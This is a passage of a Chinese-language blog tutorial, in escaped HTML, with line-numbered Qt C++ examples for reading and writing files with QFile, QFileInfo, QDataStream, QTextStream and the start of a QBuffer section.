&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (path.isEmpty() == &lt;span&gt;false&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;         QFile file(path);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;文件对象&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt;         &lt;span&gt;bool&lt;/span&gt; isOK = file.open(QIODevice::ReadOnly);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;打开文件&lt;/span&gt;
&lt;span&gt;26&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;true&lt;/span&gt; ==&lt;span&gt; isOK) {
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;             &lt;span&gt;//&lt;/span&gt;&lt;span&gt;一行一行读取文件&lt;/span&gt;
&lt;span&gt;28&lt;/span&gt; &lt;span&gt;            QByteArray array;
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;             &lt;span&gt;while&lt;/span&gt; (file.atEnd() == &lt;span&gt;false&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;                 array +=&lt;span&gt; file.readLine();
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;             ui-&amp;gt;textEdit-&amp;gt;&lt;span&gt;setText(array);
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt; &lt;span&gt;            file.close();
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; 
&lt;span&gt;38&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Widget::on_pushButton_save_clicked()
&lt;/span&gt;&lt;span&gt;39&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;     QString path = QFileDialog::getOpenFileName(&lt;span&gt;this&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;open&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;TXT(*.txt)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (path.isEmpty() == &lt;span&gt;false&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;         QFile file(path);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;文件对象&lt;/span&gt;
&lt;span&gt;43&lt;/span&gt;         &lt;span&gt;bool&lt;/span&gt; isOK = file.open(QIODevice::WriteOnly);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt;打开文件&lt;/span&gt;
&lt;span&gt;44&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;true&lt;/span&gt; ==&lt;span&gt; isOK) {
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt;             &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取文本编辑区的内容&lt;/span&gt;
&lt;span&gt;46&lt;/span&gt;             QString str = ui-&amp;gt;textEdit-&amp;gt;&lt;span&gt;toPlainText();
&lt;/span&gt;&lt;span&gt;47&lt;/span&gt;             &lt;span&gt;//&lt;/span&gt;&lt;span&gt;转换为本地编码写入&lt;/span&gt;
&lt;span&gt;48&lt;/span&gt; &lt;span&gt;            file.write(str.toLocal8Bit());
&lt;/span&gt;&lt;span&gt;49&lt;/span&gt; &lt;span&gt;            file.close();
&lt;/span&gt;&lt;span&gt;50&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;51&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt; }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;运行测试：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1078885/202007/1078885-20200708232630253-1380790468.gif&quot; alt=&quot;&quot; width=&quot;350&quot; height=&quot;255&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;上述代码中，打开文件使用的是系统默认的编码格式：UTF-8，如果打开其它编码格式的文件就会乱码。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;（2）获取文件信息&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;比如获取文件的名字、文件后缀、文件大小、文件创建时间等信息。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;通过&lt;span&gt;QFileInfo&lt;/span&gt;类来实现的。这个很简单，直接给出测试代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('9e823b98-95f2-4941-ad13-5a13b213a5f2')&quot; readability=&quot;33&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; id=&quot;code_img_closed_9e823b98-95f2-4941-ad13-5a13b213a5f2&quot; class=&quot;code_img_closed&quot;/&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; id=&quot;code_img_opened_9e823b98-95f2-4941-ad13-5a13b213a5f2&quot; class=&quot;code_img_opened&quot;/&gt;&lt;/span&gt;
&lt;div id=&quot;cnblogs_code_open_9e823b98-95f2-4941-ad13-5a13b213a5f2&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt; 1&lt;/span&gt; Widget::Widget(QWidget *&lt;span&gt;parent) :
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    QWidget(parent),
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     ui(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Ui::Widget)
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     ui-&amp;gt;setupUi(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt;     QFileInfo info(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../demo.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     qDebug() &amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;文件名字&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span&gt; info.fileName().toUtf8().data();
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     qDebug() &amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;文件后缀&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span&gt; info.suffix();
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     qDebug() &amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;文件大小&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span&gt; info.size();
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     qDebug() &amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;文件创建时间&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt; info.created().toString(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;yyyy-MM-dd hh:mm:ss&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     qDebug() &amp;lt;&amp;lt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;文件路径&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span&gt; info.filePath();
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;（3）&lt;span lang=&quot;EN-US&quot;&gt;QDataStream读写文件&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot;&gt;QDataStream&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;提供了基于&lt;span lang=&quot;EN-US&quot;&gt;QIODevice&lt;/span&gt;的二进制数据的序列化。数据流是一种二进制流，这种流&lt;/span&gt;&lt;strong&gt;&lt;span&gt;完全不依赖&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;于底层操作系统、&lt;span lang=&quot;EN-US&quot;&gt;CPU&lt;/span&gt; 或者字节顺序（大端或小端）。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot;&gt;QDataStream&lt;/span&gt;&lt;span&gt;既能够存取 &lt;span lang=&quot;EN-US&quot;&gt;C++&lt;/span&gt; 基本类型，如 &lt;span lang=&quot;EN-US&quot;&gt;int&lt;/span&gt;、&lt;span lang=&quot;EN-US&quot;&gt;char&lt;/span&gt;、&lt;span lang=&quot;EN-US&quot;&gt;short&lt;/span&gt; 等，也可以存取复杂的数据类型，例如自定义的类。实际上，&lt;span lang=&quot;EN-US&quot;&gt;QDataStream&lt;/span&gt;对于类的存储，是将复杂的类分割为很多基本单元实现的。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;测试代码：创建两个函数，writeData()写文件，readData()读文件。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('7a8f24db-566e-44c1-897a-f06fd992ccc4')&quot; readability=&quot;33&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; id=&quot;code_img_closed_7a8f24db-566e-44c1-897a-f06fd992ccc4&quot; class=&quot;code_img_closed&quot;/&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; id=&quot;code_img_opened_7a8f24db-566e-44c1-897a-f06fd992ccc4&quot; class=&quot;code_img_opened&quot;/&gt;&lt;/span&gt;
&lt;div id=&quot;cnblogs_code_open_7a8f24db-566e-44c1-897a-f06fd992ccc4&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt; 1&lt;/span&gt; #include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;widget.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; #include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ui_widget.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; #include &amp;lt;QDataStream&amp;gt;
&lt;span&gt; 4&lt;/span&gt; #include &amp;lt;QFile&amp;gt;
&lt;span&gt; 5&lt;/span&gt; #include &amp;lt;QDebug&amp;gt;
&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;#define&lt;/span&gt; cout qDebug() &amp;lt;&amp;lt; &quot;[&quot; &amp;lt;&amp;lt; __FILE__ &amp;lt;&amp;lt;&quot;:&quot; &amp;lt;&amp;lt; __LINE__ &amp;lt;&amp;lt; &quot;]&quot;
&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt; Widget::Widget(QWidget *&lt;span&gt;parent) :
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    QWidget(parent),
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     ui(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Ui::Widget)
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     ui-&amp;gt;setupUi(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt; &lt;span&gt;    writeData();
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;    readData();
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; 
&lt;span&gt;20&lt;/span&gt; Widget::~&lt;span&gt;Widget()
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt; &lt;span&gt;    delete ui;
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; 
&lt;span&gt;25&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Widget::writeData()
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建文件对象&lt;/span&gt;
&lt;span&gt;28&lt;/span&gt;     QFile file(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../text.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;打开文件，只写方式&lt;/span&gt;
&lt;span&gt;30&lt;/span&gt;     &lt;span&gt;bool&lt;/span&gt; isOK =&lt;span&gt; file.open(QIODevice::WriteOnly);
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;true&lt;/span&gt; ==&lt;span&gt; isOK) {
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建数据流，和file文件关联
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;往数据流中写数据，相当于往文件里写数据（二进制）&lt;/span&gt;
&lt;span&gt;34&lt;/span&gt;         QDataStream stream(&amp;amp;&lt;span&gt;file);
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt;         stream &amp;lt;&amp;lt; QString(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;主要看气质&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &amp;lt;&amp;lt; &lt;span&gt;250&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt; &lt;span&gt;        file.close();
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;38&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;39&lt;/span&gt; 
&lt;span&gt;40&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Widget::readData()
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建文件对象&lt;/span&gt;
&lt;span&gt;43&lt;/span&gt;     QFile file(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../text.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;44&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;打开文件，只读方式&lt;/span&gt;
&lt;span&gt;45&lt;/span&gt;     &lt;span&gt;bool&lt;/span&gt; isOK =&lt;span&gt; file.open(QIODevice::ReadOnly);
&lt;/span&gt;&lt;span&gt;46&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;true&lt;/span&gt; ==&lt;span&gt; isOK) {
&lt;/span&gt;&lt;span&gt;47&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建数据流，和file文件关联
&lt;/span&gt;&lt;span&gt;48&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;从数据流中读数据，相当于从文件里读数据（二进制）&lt;/span&gt;
&lt;span&gt;49&lt;/span&gt;         QDataStream stream(&amp;amp;&lt;span&gt;file);
&lt;/span&gt;&lt;span&gt;50&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;读的时候，按写的顺序取数据&lt;/span&gt;
&lt;span&gt;51&lt;/span&gt; &lt;span&gt;        QString str;
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt;         &lt;span&gt;int&lt;/span&gt;&lt;span&gt; a;
&lt;/span&gt;&lt;span&gt;53&lt;/span&gt;         stream &amp;gt;&amp;gt; str &amp;gt;&amp;gt;&lt;span&gt; a;
&lt;/span&gt;&lt;span&gt;54&lt;/span&gt;         cout &amp;lt;&amp;lt; str &amp;lt;&amp;lt;&lt;span&gt; a;
&lt;/span&gt;&lt;span&gt;55&lt;/span&gt; &lt;span&gt;        file.close();
&lt;/span&gt;&lt;span&gt;56&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;57&lt;/span&gt; }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;运行测试：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;打印输出：[ ..\file_2\widget.cpp : 54 ] &quot;主要看气质&quot; 250&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们打开text.txt文件，会看到是乱码的，因为是二进制文件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;（4&lt;span&gt;）&lt;span lang=&quot;EN-US&quot;&gt;QTextStream读写文件&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;QTextStream是操作纯文本文件的。&lt;span lang=&quot;EN-US&quot;&gt;QTextStream&lt;/span&gt;&lt;span&gt;会自动将 &lt;span lang=&quot;EN-US&quot;&gt;Unicode&lt;/span&gt; 编码同操作系统的编码进行转换，这一操作对开发人员是透明的。它也会将换行符进行转换，同样不需要自己处理。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot;&gt;QTextStream&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;使用 &lt;span lang=&quot;EN-US&quot;&gt;16&lt;/span&gt; 位的&lt;span lang=&quot;EN-US&quot;&gt;QChar&lt;/span&gt;作为基础的数据存储单位，同样，它也支持 &lt;span lang=&quot;EN-US&quot;&gt;C++&lt;/span&gt; 标准类型，如 &lt;span lang=&quot;EN-US&quot;&gt;int&lt;/span&gt; 等。实际上，这是将这种标准类型与字符串进行了相互转换。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;测试代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('5fd90124-8574-4f95-9a5b-ff64999f4f32')&quot; readability=&quot;33&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; id=&quot;code_img_closed_5fd90124-8574-4f95-9a5b-ff64999f4f32&quot; class=&quot;code_img_closed&quot;/&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; id=&quot;code_img_opened_5fd90124-8574-4f95-9a5b-ff64999f4f32&quot; class=&quot;code_img_opened&quot;/&gt;&lt;/span&gt;
&lt;div id=&quot;cnblogs_code_open_5fd90124-8574-4f95-9a5b-ff64999f4f32&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&lt;span&gt; 1&lt;/span&gt; #include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;widget.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; #include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ui_widget.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; #include &amp;lt;QFile&amp;gt;
&lt;span&gt; 4&lt;/span&gt; #include &amp;lt;QTextStream&amp;gt;
&lt;span&gt; 5&lt;/span&gt; #include &amp;lt;QDebug&amp;gt;
&lt;span&gt; 6&lt;/span&gt; #include &amp;lt;QFileDialog&amp;gt;
&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;#define&lt;/span&gt; cout qDebug() &amp;lt;&amp;lt; &quot;[&quot; &amp;lt;&amp;lt; __FILE__ &amp;lt;&amp;lt;&quot;:&quot; &amp;lt;&amp;lt; __LINE__ &amp;lt;&amp;lt; &quot;]&quot;
&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt; Widget::Widget(QWidget *&lt;span&gt;parent) :
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    QWidget(parent),
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     ui(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Ui::Widget)
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     ui-&amp;gt;setupUi(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt; &lt;span&gt;    writeData();
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;    readData();
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; 
&lt;span&gt;20&lt;/span&gt; Widget::~&lt;span&gt;Widget()
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;     &lt;span&gt;delete&lt;/span&gt;&lt;span&gt; ui;
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; 
&lt;span&gt;25&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Widget::writeData()
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; &lt;span&gt;    QFile file;
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt;     file.setFileName(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../demo.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;     &lt;span&gt;bool&lt;/span&gt; isOK =&lt;span&gt; file.open(QIODevice::WriteOnly);
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;true&lt;/span&gt; ==&lt;span&gt; isOK) {
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;         QTextStream stream(&amp;amp;&lt;span&gt;file);
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;指定编码&lt;/span&gt;
&lt;span&gt;33&lt;/span&gt;         stream.setCodec(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt;         stream &amp;lt;&amp;lt; QString(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;主要看气质&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;) &amp;lt;&amp;lt; &lt;span&gt;250&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt; &lt;span&gt;        file.close();
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; &lt;span&gt;}
&lt;/span&gt;&lt;span&gt;38&lt;/span&gt; 
&lt;span&gt;39&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Widget::readData()
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt; &lt;span&gt;    QFile file;
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;     file.setFileName(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;../demo.txt&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;43&lt;/span&gt;     &lt;span&gt;bool&lt;/span&gt; isOK =&lt;span&gt; file.open(QIODevice::ReadOnly);
&lt;/span&gt;&lt;span&gt;44&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (&lt;span&gt;true&lt;/span&gt; ==&lt;span&gt; isOK) {
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt;         QTextStream stream(&amp;amp;&lt;span&gt;file);
&lt;/span&gt;&lt;span&gt;46&lt;/span&gt;         stream.setCodec(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UTF-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;47&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;读取出来的就是字符串&lt;/span&gt;
&lt;span&gt;48&lt;/span&gt;         QString str =&lt;span&gt; stream.readAll();
&lt;/span&gt;&lt;span&gt;49&lt;/span&gt;         cout &amp;lt;&amp;lt;&lt;span&gt; str;
&lt;/span&gt;&lt;span&gt;50&lt;/span&gt; &lt;span&gt;        file.close();
&lt;/span&gt;&lt;span&gt;51&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt; }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;运行测试：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;打印输出：[ ..\file_3\widget.cpp : 53 ] &quot;主要看气质250&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;打开demo.txt文件，可以发现文件是可读的，不会乱码。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;（5）QBuffer读写文件&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;QBuffer创建的是内存文件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;直接给出测试代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('8e89691b-7113-49d7-8c19-6ac37c926ad5')&quot; readability=&quot;33&quot;&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; id=&quot;code_img_closed_8e89691b-7113-49d7-8c19-6ac37c926ad5&quot; class=&quot;code_img_closed&quot;/&gt;&lt;img src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; id=&quot;code_img_opened_8e89691b-7113-49d7-8c19-6ac37c926ad5&quot; class=&quot;code_img_opened&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_8e89691b-7113-49d7-8c19-6ac37c926ad5&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; Widget::Widget(QWidget *&lt;span&gt;parent) :
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    QWidget(parent),
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;     ui(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Ui::Widget)
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;{
